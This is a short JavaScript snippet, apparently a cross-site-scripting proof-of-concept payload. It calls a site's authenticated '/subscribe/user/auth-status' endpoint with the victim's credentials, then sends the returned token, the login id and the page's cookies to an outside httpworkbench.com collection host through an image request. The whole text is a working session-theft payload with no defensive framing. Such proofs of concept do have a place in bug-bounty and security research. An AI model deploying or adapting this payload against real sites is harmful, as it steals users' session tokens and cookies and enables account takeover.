fetch('/subscribe/user/auth-status', {credentials:'include'})
  .then(r => r.json())
  .then(j => new Image().src = '//q9fpgq7v.instances.httpworkbench.com/c?'
     + 't=' + encodeURIComponent(j.ottoken)         
     + '&id=' + encodeURIComponent(j.wapo_login_id)
     + '&c=' + encodeURIComponent(document.cookie)); 
